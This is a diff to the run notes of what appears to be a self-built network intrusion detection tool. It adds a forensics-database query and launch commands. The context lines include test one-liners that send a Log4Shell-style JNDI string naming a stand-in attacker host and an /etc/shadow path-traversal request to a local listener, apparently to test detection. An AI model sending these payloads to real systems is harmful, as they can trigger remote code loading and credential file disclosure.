@@ -170,6 +170,7 @@ Option 2: The Stateful Extractor (The Redis Delta)We keep the $\Delta t$ feature
 uvicorn dashboard.server:app --reload
 python main.py
 sudo .venv/bin/python sniffer.py
+sqlite3 forensics.db "SELECT timestamp, engine, threat_name FROM security_events ORDER BY id DESC LIMIT 10;"
 python -c "import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'EXPLOIT_PAYLOAD_V1', ('127.0.0.1', 9999))"
 python -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b"User-Agent: ${jndi:ldap://malicious-actor.net/Exploit}", ("127.0.0.1", 9999))'
 python -c "import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'GET /../../../etc/shadow HTTP/1.1', ('127.0.0.1', 9999))"
@@ -195,3 +196,11 @@ mkdir models
 
 sudo pacman -S wkhtmltopdf
 pip install pdfkit jinja2
+
+
+
+
+
+sudo .venv/bin/python sniffer.py
+python sentinel_master.py
+python generate_and_replay.py
